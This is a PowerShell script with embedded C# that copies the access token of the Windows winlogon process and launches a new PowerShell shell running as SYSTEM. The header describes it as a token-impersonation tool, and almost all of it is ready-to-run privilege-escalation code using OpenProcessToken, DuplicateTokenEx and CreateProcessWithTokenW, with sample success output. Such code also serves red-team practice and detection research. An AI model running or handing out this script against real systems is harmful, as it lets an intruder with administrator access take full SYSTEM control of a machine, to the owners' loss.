<#
.SYNOPSIS
    Token Impersonation and Process Spawning via Win32 API.
    
.DESCRIPTION
    This script finds a process token (default: winlogon) and uses it to 
    spawn a new process (default: powershell.exe) as that user.
    It uses OpenProcessToken, DuplicateTokenEx, and CreateProcessWithTokenW.
    This ensures external commands (like whoami) see the new identity.

.USAGE
    PS C:\> . .\Token-Impersonation.ps1
    [*] Searching for 'winlogon'...
    [+] Success! Spawned new shell as SYSTEM.
#>

$Code = @"
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;

public class TokenImpersonator
{
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

    [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcessWithTokenW(IntPtr hToken, uint dwLogonFlags, string lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [DllImport("kernel32.dll")]
    public static extern uint GetLastError();

    public static void SpawnAsSystem(int pid, string command)
    {
        IntPtr hProcess = OpenProcess(0x0400, false, (uint)pid); // PROCESS_QUERY_INFORMATION
        if (hProcess == IntPtr.Zero) {
            Console.WriteLine("[-] Failed to open process: " + GetLastError());
            return;
        }

        IntPtr hToken;
        if (!OpenProcessToken(hProcess, 0x0002, out hToken)) { // TOKEN_DUPLICATE
            Console.WriteLine("[-] Failed to open token: " + GetLastError());
            return;
        }

        IntPtr hNewToken;
        // SecurityImpersonation=2, TokenPrimary=1
        if (!DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hNewToken)) {
            Console.WriteLine("[-] Failed to duplicate token: " + GetLastError());
            return;
        }

        STARTUPINFO si = new STARTUPINFO();
        si.cb = (uint)Marshal.SizeOf(si);
        si.lpDesktop = "WinSta0\\Default"; // Required for interactive desktop
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

        // LOGON_NETCREDENTIALS_ONLY = 2 (standard for this API)
        if (CreateProcessWithTokenW(hNewToken, 2, null, command, 0, IntPtr.Zero, null, ref si, out pi)) {
            Console.WriteLine("[+] Success! Spawned process with PID: " + pi.dwProcessId);
        } else {
            Console.WriteLine("[-] Failed to spawn process: " + GetLastError());
        }
    }
}
"@

Add-Type -TypeDefinition $Code -Language CSharp

$Proc = Get-Process -Name winlogon -ErrorAction SilentlyContinue
if ($Proc) {
    Write-Host "[*] Found winlogon PID: $($Proc.Id). Spawning elevated PowerShell..." -ForegroundColor Cyan
    # Spawning powershell.exe as SYSTEM
    [TokenImpersonator]::SpawnAsSystem($Proc.Id, "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe")
} else {
    Write-Host "[-] Winlogon not found. Are you Admin?" -ForegroundColor Red
}
